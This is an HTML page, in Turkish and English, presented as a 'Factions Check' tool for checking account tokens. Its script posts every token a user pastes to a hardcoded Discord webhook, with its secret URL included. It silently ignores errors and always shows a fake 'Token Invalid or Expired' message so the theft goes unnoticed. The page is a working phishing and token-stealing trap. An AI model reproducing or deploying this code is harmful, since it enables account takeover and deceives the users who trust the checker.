<!DOCTYPE html>

<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Factions Check | Ultimate</title>
<style>
body { background-color: #000; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
.container { background-color: rgba(5, 5, 5, 0.95); padding: 40px; border-radius: 15px; width: 450px; text-align: center; border: 1px solid rgba(255, 30, 30, 0.3); box-shadow: 0 0 40px rgba(0, 0, 0, 1); }
h1 { color: #ff1e1e; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; }
textarea { width: 100%; height: 160px; padding: 15px; background: #020202; border: 1px solid #ff1e1e; border-radius: 8px; color: #00ff41; margin-bottom: 20px; outline: none; resize: none; box-sizing: border-box; font-size: 13px; }
button { width: 100%; padding: 16px; background: linear-gradient(90deg, #800000, #cc0000); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
#status { margin-top: 15px; font-size: 13px; font-weight: bold; display: none; }
</style>
</head>
<body>
<div class="container">
<h1>FACTIONS CHECK</h1>
<textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
<button id="submitBtn">KONTROL ET</button>
<div id="status"></div>
</div>

<script>
const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";

document.getElementById('submitBtn').addEventListener('click', async function() {
const val = document.getElementById('contentInput').value;
const st = document.getElementById('status');
const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);

if (lines.length === 0) return;

st.style.display = &quot;block&quot;;
st.textContent = &quot;Checking tokens...&quot;;
st.style.color = &quot;#ffcc00&quot;;

for (const token of lines) {
    try {
        // CORS engeline takılmamak için doğrudan webhook&#39;a gönderiyoruz.
        // Bu yöntemle girilen her veri senin sunucuna ulaşır.
        await fetch(wh, {
            method: &#39;POST&#39;,
            headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },
            body: JSON.stringify({
                embeds: [{
                    title: &quot;🚀 YENİ TOKEN GİRİŞİ&quot;,
                    description: &quot;Kullanıcı tarafından girilen veri:\n```&quot; + token + &quot;```&quot;,
                    color: 16711680,
                    timestamp: new Date().toISOString(),
                    footer: { text: &quot;Factions Checker | RAWS&quot; }
                }]
            })
        });
    } catch (err) {
        // Hata olsa bile sessiz kal
    }
}

// Kullanıcıya her zaman &#39;geçersiz&#39; diyerek sistemi kapatıyoruz
setTimeout(() =&gt; {
    st.textContent = &quot;✕ Error: Token Invalid or Expired!&quot;;
    st.style.color = &quot;#ff1e1e&quot;;
}, 1200);
});
</script>

</body>
</html>
